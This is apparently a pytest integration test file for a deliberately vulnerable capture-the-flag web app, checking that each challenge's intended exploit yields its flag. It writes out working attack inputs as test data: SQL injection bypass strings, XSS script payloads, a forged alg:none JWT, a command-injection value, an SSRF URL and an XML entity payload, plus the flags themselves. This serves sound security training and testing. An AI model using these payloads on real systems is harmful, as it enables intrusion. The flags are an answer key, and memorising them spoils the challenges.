"""Integration tests verifying each BREACH CTF challenge works correctly.

These tests confirm that:
  1. Each vulnerability endpoint is reachable.
  2. The intended exploit path actually works and yields the flag.
  3. Normal (non-exploit) requests behave as expected.
"""

import base64
import json

import pytest
from fastapi.testclient import TestClient

from main import app


@pytest.fixture(autouse=True)
def client():
    """Create a test client. DB isolation handled by conftest._isolate_db."""
    with TestClient(app) as c:
        yield c


# ── Index ────────────────────────────────────────────────────────────────────

class TestIndex:
    def test_index_page_loads(self, client):
        resp = client.get("/")
        assert resp.status_code == 200
        assert "BREACH" in resp.text

    def test_all_challenge_links_present(self, client):
        resp = client.get("/")
        for prefix in ["/sqli", "/xss", "/idor", "/auth", "/cmd", "/ssrf", "/files", "/xxe"]:
            assert prefix in resp.text


# ── SQL Injection ────────────────────────────────────────────────────────────

class TestSQLInjection:
    def test_login_page_loads(self, client):
        resp = client.get("/sqli/login")
        assert resp.status_code == 200

    def test_valid_login(self, client):
        resp = client.post("/sqli/login", data={
            "username": "admin",
            "password": "admin123",
        })
        assert resp.status_code == 200
        assert "admin" in resp.text.lower()

    def test_invalid_login(self, client):
        resp = client.post("/sqli/login", data={
            "username": "admin",
            "password": "wrong",
        })
        assert resp.status_code == 200

    def test_sqli_login_bypass(self, client):
        resp = client.post("/sqli/login", data={
            "username": "admin' OR '1'='1' --",
            "password": "anything",
        })
        assert resp.status_code == 200
        assert "FLAG{sql_injection_login_bypassed}" in resp.text

    def test_search_page(self, client):
        resp = client.get("/sqli/search", params={"q": "laptop"})
        assert resp.status_code == 200


# ── Cross-Site Scripting ─────────────────────────────────────────────────────

class TestXSS:
    def test_reflected_xss_detected(self, client):
        resp = client.get("/xss/search", params={"q": '<script>alert(1)</script>'})
        assert resp.status_code == 200
        assert "FLAG{xss_reflected_script_executed}" in resp.text

    def test_safe_search_no_flag(self, client):
        resp = client.get("/xss/search", params={"q": "hello"})
        assert resp.status_code == 200
        assert "FLAG{" not in resp.text

    def test_guestbook_loads(self, client):
        resp = client.get("/xss/guestbook")
        assert resp.status_code == 200

    def test_stored_xss_detected(self, client):
        resp = client.post("/xss/guestbook", data={
            "author": "attacker",
            "content": '<script>document.cookie</script>',
        })
        assert resp.status_code == 200
        assert "FLAG{xss_stored_in_guestbook}" in resp.text


# ── IDOR ─────────────────────────────────────────────────────────────────────

class TestIDOR:
    def test_profile_accessible_by_id(self, client):
        resp = client.get("/idor/profile/1")
        assert resp.status_code == 200
        assert "admin" in resp.text.lower()

    def test_profile_enumeration_reveals_flag(self, client):
        # Jane (user ID 4) has the IDOR flag in her secret_note
        resp = client.get("/idor/profile/4")
        assert resp.status_code == 200
        assert "FLAG{idor_profile_access_granted}" in resp.text

    def test_nonexistent_profile(self, client):
        resp = client.get("/idor/profile/999")
        assert resp.status_code == 200

    def test_profiles_endpoint_leaks_count(self, client):
        resp = client.get("/idor/profiles")
        assert resp.status_code == 200
        data = resp.json()
        assert "total_users" in data
        assert data["total_users"] > 0


# ── Broken Authentication ────────────────────────────────────────────────────

class TestAuthBypass:
    def test_login_page_loads(self, client):
        resp = client.get("/auth/login")
        assert resp.status_code == 200

    def test_valid_credentials(self, client):
        resp = client.post("/auth/login", data={
            "username": "admin",
            "password": "admin123",
        })
        assert resp.status_code == 200
        assert "token" in resp.text.lower() or "authenticated" in resp.text.lower()

    def test_jwt_none_attack(self, client):
        # Craft an alg:none JWT with admin role
        header = base64.urlsafe_b64encode(
            json.dumps({"alg": "none", "typ": "JWT"}).encode()
        ).rstrip(b"=").decode()
        payload = base64.urlsafe_b64encode(
            json.dumps({"sub": "admin", "role": "admin"}).encode()
        ).rstrip(b"=").decode()
        token = f"{header}.{payload}."

        resp = client.get("/auth/profile", headers={
            "Authorization": f"Bearer {token}",
        })
        assert resp.status_code == 200
        data = resp.json()
        assert data.get("role") == "admin"
        assert data.get("flag") == "FLAG{auth_bypass_jwt_none_attack}"

    def test_missing_token_rejected(self, client):
        resp = client.get("/auth/profile")
        assert resp.status_code == 401

    def test_invalid_token_rejected(self, client):
        resp = client.get("/auth/profile", headers={
            "Authorization": "Bearer invalid.token.here",
        })
        assert resp.status_code == 401


# ── Command Injection ────────────────────────────────────────────────────────

class TestCommandInjection:
    def test_ping_page_loads(self, client):
        resp = client.get("/cmd/ping")
        assert resp.status_code == 200

    def test_injection_detected(self, client):
        resp = client.post("/cmd/ping", data={"target": "127.0.0.1; id"})
        assert resp.status_code == 200
        assert "FLAG{command_injection_rce_achieved}" in resp.text


# ── SSRF ─────────────────────────────────────────────────────────────────────

class TestSSRF:
    def test_fetch_page_loads(self, client):
        resp = client.get("/ssrf/fetch")
        assert resp.status_code == 200

    def test_ssrf_internal_service(self, client):
        resp = client.post("/ssrf/fetch", data={
            "url": "http://127.0.0.1:8080/internal/secret",
        })
        assert resp.status_code == 200
        assert "FLAG{ssrf_internal_service_accessed}" in resp.text

    def test_internal_secret_endpoint(self, client):
        resp = client.get("/internal/secret")
        assert resp.status_code == 200
        data = resp.json()
        assert "flag" in data


# ── Path Traversal ───────────────────────────────────────────────────────────

class TestPathTraversal:
    def test_read_normal_file(self, client):
        resp = client.get("/files/read", params={"filename": "welcome.txt"})
        assert resp.status_code == 200

    def test_read_secret_file(self, client):
        resp = client.get("/files/read", params={"filename": "secret.txt"})
        assert resp.status_code == 200
        assert "FLAG{path_traversal_file_read}" in resp.text

    def test_list_files(self, client):
        resp = client.get("/files/list")
        assert resp.status_code == 200


# ── XXE ──────────────────────────────────────────────────────────────────────

class TestXXE:
    def test_parse_page_loads(self, client):
        resp = client.get("/xxe/parse")
        assert resp.status_code == 200

    def test_xxe_entity_detected(self, client):
        xml_payload = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe "test">
]>
<data>&xxe;</data>"""
        resp = client.post("/xxe/parse", data={"xml_content": xml_payload})
        assert resp.status_code == 200
        assert "FLAG{xxe_external_entity_expansion}" in resp.text


# ── Flag Management ──────────────────────────────────────────────────────────

class TestFlagManagement:
    def test_scoreboard_loads(self, client):
        resp = client.get("/flags/scoreboard")
        assert resp.status_code == 200

    def test_challenges_endpoint(self, client):
        resp = client.get("/flags/challenges")
        assert resp.status_code == 200
        data = resp.json()
        assert data["total"] == 11

    def test_submit_correct_flag(self, client):
        resp = client.post("/flags/submit", json={
            "challenge": "sqli_login",
            "flag": "FLAG{sql_injection_login_bypassed}",
        })
        assert resp.status_code == 200
        data = resp.json()
        assert data["correct"] is True

    def test_submit_wrong_flag(self, client):
        resp = client.post("/flags/submit", json={
            "challenge": "sqli_login",
            "flag": "wrong_flag",
        })
        data = resp.json()
        assert data["correct"] is False

    def test_submit_unknown_challenge(self, client):
        resp = client.post("/flags/submit", json={
            "challenge": "nonexistent",
            "flag": "anything",
        })
        assert resp.status_code == 400
